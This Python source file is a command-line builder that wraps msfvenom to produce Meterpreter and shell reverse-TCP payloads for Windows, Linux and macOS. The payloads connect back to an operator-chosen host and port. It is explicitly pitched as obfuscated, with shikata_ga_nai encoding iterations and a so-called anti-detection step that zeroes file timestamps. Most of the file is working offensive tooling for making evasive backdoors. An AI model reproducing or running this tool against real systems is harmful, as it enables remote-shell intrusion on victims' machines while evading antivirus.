import argparse
import os
import subprocess
import sys
import re
from colorama import Fore, Style, init
import time
import threading

init(autoreset=True)

class CustomHelpFormatter(argparse.HelpFormatter):
    def __init__(self, prog):
        super().__init__(prog, max_help_position=40, width=100)

    def _split_lines(self, text, width):
        return [text]

    def _format_action(self, action):
        parts = super()._format_action(action)
        return re.sub(r'\(default: .*?\)', '', parts)  # Eliminar texto de default automático

class PayloadGenerator:
    def __init__(self):
        banner_width = 55
        self.banner = [
            Fore.RED + r"    __  ___ _____  ______   ____          _  __     __",
            Fore.RED + r"   /  |/  // ___/ / ____/  / __ ) __  __ (_)/ /____/ /",
            Fore.RED + r"  / /|_/ / \__ \ / /_     / __  |/ / / // // // __  / ",
            Fore.RED + r" / /  / / ___/ // __/    / /_/ // /_/ // // // /_/ /  ",
            Fore.RED + r"/_/  /_/ /____//_/      /_____/ \__,_//_//_/ \__,_/   ",
            Fore.RED + "-" * banner_width,
            Fore.RED + "  Msfvenom Advanced Obfuscated Payload Builder  ".center(banner_width),
            Fore.RED + "-" * banner_width,
            Fore.YELLOW + "Developed by: @afsh4ck".center(banner_width) + Style.RESET_ALL
        ]

        self.config = {
            "windows": {
                "x86": {"payload": "windows/meterpreter/reverse_tcp", "formats": ["exe", "python"]},
                "x64": {"payload": "windows/x64/meterpreter/reverse_tcp", "formats": ["exe", "python"]}
            },
            "linux": {
                "x86": {"payload": "linux/x86/meterpreter/reverse_tcp", "formats": ["elf", "python"]},
                "x64": {"payload": "linux/x64/meterpreter/reverse_tcp", "formats": ["elf", "python"]}
            },
            "macos": {
                "x64": {"payload": "osx/x64/shell_reverse_tcp", "formats": ["macho", "python"]}
            }
        }

    def print_banner(self):
        for line in self.banner:
            print(line)
            time.sleep(0.15)
        print("\n")

    def validate_config(self, os_target, arch, file_type):
        if os_target not in self.config:
            raise ValueError(f"OS no soportado: {os_target}")
        if arch not in self.config[os_target]:
            raise ValueError(f"Arquitectura no soportada para {os_target}: {arch}")
        if file_type not in self.config[os_target][arch]["formats"]:
            raise ValueError(f"Formato no soportado para {os_target}/{arch}: {file_type}")

    def generate_payload(self, os_target, arch, file_type, lhost, lport, output_file, iterations):
        try:
            self.validate_config(os_target, arch, file_type)
            payload = self.config[os_target][arch]["payload"]
            encoder = "x86/shikata_ga_nai" if arch == "x86" and iterations > 0 else ""

            cmd = [
                "msfvenom",
                "-p", payload,
                f"LHOST={lhost}",
                f"LPORT={lport}",
                "-a", arch,
                "--platform", os_target,
                "-f", file_type,
                "-o", output_file
            ]

            if encoder:
                cmd.extend(["-e", encoder, "-i", str(iterations)])

            self.progress = True
            spinner_thread = threading.Thread(target=self.show_spinner)
            spinner_thread.start()

            subprocess.run(cmd, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

            self.progress = False
            spinner_thread.join()

            print(f"\n{Fore.GREEN}[+] Payload generado exitosamente en: {output_file}{Style.RESET_ALL}")
            self.add_antidetect_measures(output_file, file_type)

        except Exception as e:
            self.progress = False
            print(f"\n{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")
            sys.exit(1)

    def add_antidetect_measures(self, file_path, file_type):
        try:
            if file_type == "exe":
                os.utime(file_path, (0, 0))
            print(f"{Fore.CYAN}[*] Medidas anti-detección aplicadas{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.YELLOW}[!] Advertencia: {str(e)}{Style.RESET_ALL}")

    def show_spinner(self):
        symbols = ["▁▂▃", "▂▃▄", "▃▄▅", "▄▅▆", "▅▆▇", "▆▇█", "▇█▇", "█▇▆"]
        i = 0
        while self.progress:
            print(f"\r{Fore.YELLOW}[*] Generando payload... {symbols[i % len(symbols)]}{Style.RESET_ALL}", end="")
            time.sleep(0.1)
            i += 1

def main():
    generator = PayloadGenerator()
    generator.print_banner()

    parser = argparse.ArgumentParser(
        description="",
        formatter_class=CustomHelpFormatter,
        add_help=False,
        usage=f"{Fore.RED}python3 msfbuild.py --os <OS> --arch <ARCH> --type <TYPE> --lhost <IP> --lport <PORT> -o <OUTPUT> [-i ITERATIONS]{Style.RESET_ALL}"
    )

    # Configuración de argumentos
    parser.add_argument("--os", required=True, choices=["windows", "linux", "macos"], help="Sistema operativo objetivo")
    parser.add_argument("--arch", required=True, choices=["x86", "x64"], help="Arquitectura objetivo")
    parser.add_argument("--type", required=True, choices=["exe", "elf", "macho", "python"], help="Tipo de archivo de salida")
    parser.add_argument("--lhost", required=True, help="Dirección IP para conexión reversa")
    parser.add_argument("--lport", required=True, help="Puerto para conexión reversa")
    parser.add_argument("-o", "--output", required=True, help="Nombre del archivo de salida")
    parser.add_argument("-i", "--iterations", type=int, default=5, help="Iteraciones de ofuscación (solo x86)")
    parser.add_argument("-h", "--help", action="help", help="Mostrar este mensaje de ayuda")

    args = parser.parse_args()

    try:
        print(f"{Fore.CYAN}[*] Configuración seleccionada:{Style.RESET_ALL}")
        print(f"{Fore.BLUE}  → Sistema Operativo: {args.os}")
        print(f"  → Arquitectura: {args.arch}")
        print(f"  → Tipo de Archivo: {args.type}")
        print(f"  → LHOST: {args.lhost}")
        print(f"  → LPORT: {args.lport}")
        print(f"  → Iteraciones: {args.iterations}{Style.RESET_ALL}\n")

        if args.arch == "x64" and args.iterations > 0:
            print(f"{Fore.YELLOW}[!] Advertencia: Shikata Ga Nai solo funciona en x86{Style.RESET_ALL}")

        generator.generate_payload(
            args.os, 
            args.arch, 
            args.type,
            args.lhost,
            args.lport,
            args.output,
            args.iterations
        )

    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Operación cancelada por el usuario{Style.RESET_ALL}")
        sys.exit(1)

if __name__ == "__main__":
    main()
